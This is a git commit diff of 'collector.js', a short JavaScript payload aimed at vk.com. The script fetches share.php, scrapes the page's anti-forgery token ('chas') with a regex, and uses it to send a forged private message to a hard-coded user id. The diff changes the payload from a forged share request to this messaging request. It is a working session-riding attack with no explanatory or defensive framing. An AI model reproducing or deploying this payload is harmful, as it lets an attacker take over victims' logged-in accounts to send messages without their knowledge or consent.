6ce43e42a589763b13ea9a55e8398a7eafc69ec5
Nikolay Zhulikov <nzhulikov@users.noreply.github.com>
2019-02-18 23:52:49 +0300

    Update collector.js

--- collector.js
+++ collector.js
@@ -1,14 +1,10 @@
 var x = new XMLHttpRequest;
 x.open("GET", "share.php"), x.send(), x.onload = function(a) {
-    var b = x.responseText.match(/window.shareHash = \'(.*?)\';/)[1];
-    send(share_url(b));
+    var b = x.responseText.match(/chas: \'(.*?)\',/)[1];
+    send(b);
 };
 
 function send(a) {
     var b = new XMLHttpRequest;
-    b.open("GET", a), b.send()
-}
-
-function share_url(a) {
-    return "https://vk.com/share.php?act=a_submit&al=1&hash=" + a + "&message=test" + "&to=" + 51722292 + "&url"
+    b.open("POST", "https://vk.com/al_im.php"), b.send("act=a_send_box&al=1&from=share&media=share%3A0_0&to_ids=51722292&message=test&chas=" + a)
 }
